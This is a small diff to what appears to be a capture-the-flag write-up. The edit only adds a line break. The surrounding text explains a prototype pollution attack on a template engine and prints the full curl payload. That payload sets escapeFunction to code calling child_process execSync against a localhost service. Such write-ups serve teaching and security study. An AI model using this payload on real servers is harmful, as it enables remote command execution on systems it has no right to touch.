@@ -48,7 +48,7 @@ _proto__[settings][view options][escapeFunction] property to a string that inclu
 + Third part of the payload: `v[proto_][cache]`
 + If you don't include the "v[proto_][cache]" property in the payload, the template engine's cache will not be reset. This means that the previously compiled version of the template might still be used.
 <br>
-So, the final payload looks like:
+So, the final payload looks like:<br>
 ```
 curl -g 'http://localhost:5001/product?name=myname&v[__proto__]&v[__proto__]&v[length]=4&v[0]=0&v[1]=1&v[2]=2&v[3]=3&v[_proto__][client]=1&v[_proto__][settings][view+options][escapeFunction]=JSON.stringify;process.mainModule.require("child_process").execSync("/readflag")&v[_proto__][cache]'
 ```
